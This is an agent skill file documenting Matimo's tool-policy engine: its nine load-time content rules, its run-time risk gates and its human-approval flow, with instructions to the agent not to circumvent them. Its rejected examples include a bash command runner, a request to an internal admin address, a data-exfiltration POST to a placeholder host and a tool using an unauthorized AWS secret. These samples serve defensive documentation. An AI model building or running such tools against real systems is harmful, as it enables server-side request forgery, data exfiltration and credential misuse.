---
name: policy-validation
description: "Understand Matimo's security policy engine: which tool types an agent may create, how SSRF, domain, method and credential rules work, how matimo_validate_tool reports them, and what happens to every call at run time."
metadata:
  category: "Security & Policy"
  difficulty: "intermediate"
  apply-to: "matimo_validate_tool matimo_create_tool matimo_reload_tools"
---

# Policy Validation: Security Rules and Enforcement

This skill teaches you **Matimo's policy engine** — the deterministic rules that decide which tools you may create and what happens each time a tool runs.

## Core Principle: The Developer Sets Policy, You Work Within It

The developer configures the policy when they start Matimo (in code or a `policy.yaml`). No tool lets an agent change it. When a rule blocks you, redesign the tool; do not look for a way around the rule.

```typescript
// Set by the developer at start-up:
const matimo = await MatimoInstance.init({
  untrustedPaths: ['./agent-tools'],
  policyConfig: {
    allowedDomains: ['api.github.com', 'api.weatherapi.com'],
    allowedHttpMethods: ['GET', 'POST'],
    protectedNamespaces: ['matimo_'],
    allowedCredentials: ['GITHUB_TOKEN', 'WEATHER_API_KEY'],
  },
});
```

## Two Layers

1. **When a tool loads** — every tool you create is *untrusted* and must pass 9 content rules. A tool that breaks a critical or high rule never reaches the registry.
2. **Every time a tool runs** — the call is risk-classified, checked against execution gates, and may need a human's approval.

---

## Layer 1: The 9 Content Rules

| # | Rule id | Severity | Rejects |
|---|---------|----------|---------|
| 1 | `no-function-execution` | critical | `execution.type: function` |
| 2 | `no-command-execution` | critical | `execution.type: command` |
| 3 | `no-ssrf` | critical | URLs aimed at localhost or loopback, `0.0.0.0`, private ranges (`10.*`, `172.16-31.*`, `192.168.*`), link-local `169.254.*` (cloud metadata), or `*.internal` / `*.local` / `*.localhost` hosts |
| 4 | `unauthorized-credential` | high | A placeholder that names a credential (such as `{GITHUB_TOKEN}` or `{API_KEY}`) not in `allowedCredentials`, when the developer set one |
| 5 | `reserved-namespace` | critical | Names starting with a protected prefix (default `matimo_`) |
| 6 | `forced-approval` | high | `requires_approval` other than `true` |
| 7 | `blocked-http-method` | high | Methods outside `allowedHttpMethods` (default GET and POST) |
| 8 | `blocked-domain` | high | Hosts outside `allowedDomains`, when the developer set one (subdomains of a listed domain are allowed) |
| 9 | `forced-draft-status` | medium | A `status` other than `draft` |

Critical and high violations reject the tool. A medium violation rejects it too, unless the developer quarantines that risk for a human.

`matimo_create_tool` sets rules 6 and 9 for you (`requires_approval: true`, `status: draft`), so you never need to write those fields.

### Check a definition with matimo_validate_tool

```
matimo_validate_tool(yaml_content: "<complete YAML>")

→ {
    "valid": false,
    "schemaErrors": [],
    "policyViolations": [
      { "rule": "no-ssrf", "severity": "critical", "message": "URL targets internal/metadata network: http://169.254.169.254/..." }
    ],
    "riskLevel": "low"
  }
```

- `valid` is `true` exactly when `matimo_create_tool` would accept the definition.
- Match on `rule`, not on `message` — the wording can change.
- `matimo_validate_tool` uses the **default** rules. The developer's own `allowedDomains`, `allowedHttpMethods` and `allowedCredentials` apply when the tool loads, so a valid tool can still be listed in `rejected` by `matimo_reload_tools` with `blocked-domain`, `blocked-http-method` or `unauthorized-credential`.

### Examples

**Passes:**

```yaml
name: github_user_lookup
version: "1.0.0"
description: Look up a GitHub user
parameters:
  username:
    type: string
    required: true
    description: GitHub username
execution:
  type: http
  method: GET
  url: "https://api.github.com/users/{username}"
```

→ `{ "valid": true, "policyViolations": [], "riskLevel": "low" }`

**`no-command-execution`:**

```yaml
name: shell_runner
version: "1.0.0"
description: Run a shell command
execution:
  type: command
  command: bash
  args: ["-c", "{cmd}"]
```

→ Use an HTTP API that does the job instead.

**`no-ssrf`:**

```yaml
name: internal_probe
version: "1.0.0"
description: Read an internal service
execution:
  type: http
  method: GET
  url: "http://10.0.0.5/admin"
```

→ Internal and metadata addresses are always blocked; use a public HTTPS API.

**`reserved-namespace`:**

```yaml
name: matimo_backdoor
```

→ Choose a name without the `matimo_` prefix. (`matimo_create_tool` refuses such names before validating.)

**`blocked-domain` (at load time, with `allowedDomains: ['api.github.com']`):**

```yaml
name: exfiltrate
version: "1.0.0"
description: Send data elsewhere
execution:
  type: http
  method: POST
  url: "https://collector.example.org/upload"
```

→ Rejected by `matimo_reload_tools`. Use one of the developer's allowed domains, or ask the developer.

**`unauthorized-credential` (at load time, with `allowedCredentials: ['GITHUB_TOKEN']`):**

```yaml
name: private_repo_reader
version: "1.0.0"
description: Read a private repository
execution:
  type: http
  method: GET
  url: "https://api.github.com/repos/{owner}/{repo}"
  headers:
    Authorization: "Bearer {AWS_SECRET_ACCESS_KEY}"
```

→ Use a credential the developer allowed (`{GITHUB_TOKEN}` here).

---

## Layer 2: Every Call at Run Time

### Risk level

Each tool gets a risk level: GET is `low`; POST, PUT and PATCH are `medium`; DELETE, command tools and HTTP tools with `requires_approval: true` are `high`. A declared `risk:` can raise this, never lower it. Every tool you create keeps `requires_approval: true`, so it runs at `high`.

### Execution gates (by caller)

| Tool | Denied when |
|------|-------------|
| Deprecated | Always |
| `status: draft` | In production (the environment name contains "prod"), and elsewhere for any caller without the `admin` role |
| `requires_approval: true` | In production, for a caller without the `admin` or `operator` role |

This is why a tool you create cannot run until `matimo_approve_tool` makes it `approved`.

### Human approval

A call asks a human first when its tool has `requires_approval: true`, when it is an HTTP DELETE or command tool (unless it declares `requires_approval: false`), or when a `sql` or `command` argument contains a destructive keyword such as `DROP`, `DELETE` or `TRUNCATE`. The developer decides how: an approval callback, or patterns of tools that never ask. With neither, the call is refused. If a human declines, report it — do not retry the same call.

The developer can also quarantine every call at or above a risk level for review, whatever the tool declares.

---

## Using Validation in Your Workflow

```
1. Write the complete YAML (leave out requires_approval and status)
2. matimo_validate_tool(yaml_content)
     valid: false → read each violation's rule → redesign → validate again
     valid: true  → continue
3. matimo_create_tool(name, yaml_content, target_dir)
4. matimo_reload_tools()
     tool in rejected → a developer rule (domain, method, credential) blocked it → redesign
5. Ask a human to approve it with matimo_approve_tool, then reload again
```

See the `meta-tools-lifecycle` skill for the full lifecycle.

---

## When Policy Blocks You

| Rule | What to do |
|------|------------|
| `no-command-execution` / `no-function-execution` | Find an HTTP API that does the job |
| `no-ssrf` | Use a public HTTPS endpoint |
| `reserved-namespace` | Rename the tool |
| `blocked-domain` | Use an allowed domain, or tell the user the developer must allow this one |
| `blocked-http-method` | Use an allowed method, or tell the user |
| `unauthorized-credential` | Use an allowed credential, or tell the user |

Explain the block to the user plainly. Never try to disguise a URL, split a request, or rename a credential to get past a rule.

---

## Key Principles

1. ✅ **The developer owns the policy** — you cannot change it, and should not try
2. ✅ **Validate before creating** — `matimo_validate_tool` reports the rule ids
3. ✅ **Developer rules apply at load** — check `rejected` after every reload
4. ✅ **Created tools always need a human** — approval is never automatic
5. ✅ **Prefer GET and public APIs** — the simplest tools pass every rule

---

## References

- **Tool lifecycle**: see the `meta-tools-lifecycle` skill
- **Writing tool YAML**: see the `tool-creation` skill
